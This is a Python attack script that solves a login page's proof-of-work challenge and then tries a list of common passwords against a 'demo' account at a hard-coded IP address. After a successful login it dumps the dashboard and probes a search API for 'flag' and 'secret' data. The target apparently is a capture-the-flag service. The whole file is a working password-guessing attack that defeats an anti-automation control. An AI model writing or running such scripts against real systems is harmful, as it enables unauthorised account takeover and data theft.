#!/usr/bin/env python3
"""
Final attempt to crack demo account
Focus on demo user since it behaves differently
"""

import requests
from bs4 import BeautifulSoup
import hashlib

BASE_URL = "http://138.199.163.92:16969"

def sha256hex(text):
    return hashlib.sha256(text.encode()).hexdigest()

def solve_pow_optimized(challenge, max_nonce=300000):
    """Optimized PoW solver"""
    target = 2 ** (256 - 18)
    for nonce in range(max_nonce):
        if int(sha256hex(challenge + str(nonce)), 16) < target:
            return nonce
        if nonce % 50000 == 0 and nonce > 0:
            print(f"  Trying nonce: {nonce}...")
    return None

print("="*60)
print("Final Demo Account Attempt")
print("="*60)

# Get challenge
resp = requests.get(f"{BASE_URL}/login")
soup = BeautifulSoup(resp.text, 'html.parser')
challenge = soup.find('input', {'name': 'pow_challenge'})['value']

print(f"[*] Challenge: {challenge}")
print(f"[*] Solving PoW...")

nonce = solve_pow_optimized(challenge)

if not nonce:
    print("[-] Could not solve PoW in reasonable time")
    exit(1)

print(f"[+] PoW solved! Nonce: {nonce}")

# Try very simple passwords for demo
passwords = [
    '',  # Empty password
    ' ',  # Space
    'demo',
    'Demo',
    'DEMO',
    'password',
    'Password',
    '123456',
    '12345678',
    'demo123',
    'Demo123',
    'demo2026',
    'Demo2026',
    'quantumvault',
    'QuantumVault',
    'quantum',
    'vault',
    'guest',
    'test',
    'user',
    'welcome',
    'Welcome',
    'default',
    'Default',
]

print(f"\n[*] Trying {len(passwords)} passwords for demo user...")

session = requests.Session()

for pwd in passwords:
    data = {
        'pow_challenge': challenge,
        'pow_nonce': str(nonce),
        'username': 'demo',
        'password': pwd
    }
    
    resp = session.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
    
    status_symbol = "✓" if resp.status_code == 302 else ("?" if resp.status_code == 200 else "✗")
    print(f"  [{status_symbol}] demo:'{pwd}' -> {resp.status_code}")
    
    if resp.status_code == 302:
        print(f"\n[!] SUCCESS! Password is: '{pwd}'")
        print(f"  Redirect: {resp.headers.get('Location')}")
        print(f"  Cookies: {dict(resp.cookies)}")
        
        # Access dashboard
        dash = session.get(f"{BASE_URL}/dashboard")
        print(f"\n[+] Dashboard: {dash.status_code}")
        
        if dash.status_code == 200:
            print("Dashboard content:")
            print(dash.text[:1000])
            
            with open('dashboard_authenticated.html', 'w') as f:
                f.write(dash.text)
        
        # Access API search
        search = session.get(f"{BASE_URL}/api/search")
        print(f"\n[+] API Search: {search.status_code}")
        print(search.text)
        
        # Try with query parameters
        for query in ['', 'flag', 'Kaal', '*', 'document', 'secret']:
            search_q = session.get(f"{BASE_URL}/api/search", params={'q': query})
            if search_q.status_code == 200:
                print(f"\n[+] API Search (q={query}): {search_q.status_code}")
                print(search_q.text)
        
        break
    
    elif resp.status_code == 200:
        # User exists but wrong password - this is expected
        pass

print("\n[*] Attempt complete!")
